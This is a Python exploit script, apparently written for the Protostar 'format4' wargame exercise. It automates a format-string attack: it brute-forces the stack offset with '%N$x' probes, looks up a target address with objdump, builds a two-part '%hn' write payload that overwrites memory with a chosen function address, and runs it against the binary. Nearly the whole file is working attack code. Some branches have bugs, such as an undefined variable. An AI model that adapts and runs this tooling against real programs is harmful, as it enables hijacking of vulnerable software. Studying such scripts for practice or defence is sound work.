#!/usr/bin/env python
#-*- coding: utf-8 -*-

import sys
import struct
import subprocess
import re

if len(sys.argv) == 4:
    binary = sys.argv[1]
    var_name = sys.argv[2]
    value = int(sys.argv[3], 16)
else:
    binary = '/opt/protostar/bin/format4'
    var_name = '0x08049724'
    value = 0x080484b4

def find_var_addr(binary, var_name):
    hex_regex = re.compile('^0x[0-9A-Fa-f]{8}')
    if hex_regex.match(var_name):
        return int(var_name[2:].strip(), base=16)
    addr = 0
    p1 = subprocess.Popen(["objdump", "-D", binary], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(["grep", "-m", "1", '<'+var_name+'>'], 
                          stdin=p1.stdout, stdout=subprocess.PIPE)
    p3 = subprocess.Popen(["awk", "{FS = \" \"; print $1}" ], 
                          stdin=p2.stdout, stdout=subprocess.PIPE)
    p1.stdout.close()
    p2.stdout.close()
    res = p3.communicate()[0]
    if not res:
        print('[-] Variable not found. Note that this only works for variables ' \
              '(not functions). We search objdump output for \"<var_name>\"')
        exit()
    addr = int(res.strip(), base=16)
    return addr

def calc_payload(target_addr, offset, value): # magic formula
    hob, lob = divmod(value, 0x10000)
    addr_plus_2 = target_addr + 2
    hob_minus_8 = hob - 8
    lob_minus_8 = lob - 8
    lob_minus_hob = lob - hob
    offset_plus_1 = offset + 1
    
    print('[+] addr = {0}, addr + 2 = {1}'.format(hex(target_addr), 
                                                  hex(addr_plus_2)))
    print('[+] value = {0}, hob = {1}, lob = {2}'.format(hex(value), 
                                                         hex(hob), hex(lob)))
    print('[+] hob - 8 = {0}, lob - hob = {1}'.format(hex(hob_minus_8), 
                                                      hex(lob_minus_hob)))
    print('[+] lob - 8 = {0}, lob - hob = {1}'.format(hex(lob_minus_8), 
                                                      hex(lob_minus_hob)))
    print('[+] offset = {0}, offset + 1 = {1}'.format(hex(offset), 
                                                      hex(offset_plus_1)))

    if hob <= 8 or lob <= 8:
        payload = struct.pack('<L', target_addr)
        payload += '%.' + str(value - 4) + 'd%' + str(i) + '$n'
        return payload

    if hob < lob:
        payload = struct.pack('<L', addr_plus_2)
        payload += struct.pack('<L', target_addr)
        payload += '%' + str(hob_minus_8) + 'x%' + str(offset) + '$hn%.'
        payload += str(lob_minus_hob) + 'x%' + str(offset_plus_1) + '$hn'
        print('[+] Payload: [{0}][{1}]%[{2}].x%[{3}]' \
              '$hn%.[{4}]x%[{5}]$hn'.format(hex(addr_plus_2),hex(target_addr), 
                                           str(hob_minus_8), str(offset), 
                                           str(lob_minus_hob), 
                                           str(offset_plus_1)))
    else:
        print('2')
        payload = struct.pack('<L', addr_plus_2)
        payload += struct.pack('<L', target_addr)
        payload += '%' + str(lob_minus_8) + 'x%' + str(offset_plus_1) + '$hn%.'
        payload += str(hob_minus_lob) + 'x%' + str(offset) + '$hn'
        print('[+] Payload: [{0}][{1}]%.[{2}]x%[{3}]' \
              '$hn%.[{4}]x%[{5}]$hn'.format(hex(addr_plus_2),hex(target_addr), 
                                           str(lob_minus_8), str(offset_plus_1), 
                                           str(hob_minus_lob), str(offset)))
    return payload

found = False
for i in range(1, 1024):
    payload = struct.pack('<L', 0x41414141)
    payload += '.%' + str(i) + '$x'
    p1 = subprocess.Popen(["echo", "-e", payload], stdout=subprocess.PIPE)
    p2 = subprocess.Popen([binary], stdin=p1.stdout, stdout=subprocess.PIPE)
    p1.stdout.close()
    res = p2.communicate()[0]
    out_regex = re.compile('AAAA.41414141*')
    if out_regex.match(res):
        found = True
        break

if found:
    print('[+] Offset = {0}'.format(i))
    
    addr = find_var_addr(binary, var_name)
    print('[+] Address to write in ({0}) = {1}'.format(var_name, hex(addr)))
    payload = calc_payload(addr, i, value)

    with open('payload', 'w') as fd:
        fd.write(payload)
    fd2 = open('out', 'w')
    p1 = subprocess.Popen([binary], stdin=open('payload', 'r'), 
                          stdout=fd2, stderr=fd2)
    print('[+] Output written in \"out\" file.')
    #p1 = subprocess.Popen([binary], stdin=open('payload', 'r'), 
    #stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    #res = p1.communicate()
    #print(res)
else:
    print('[-] Format string not found in arguments stack')
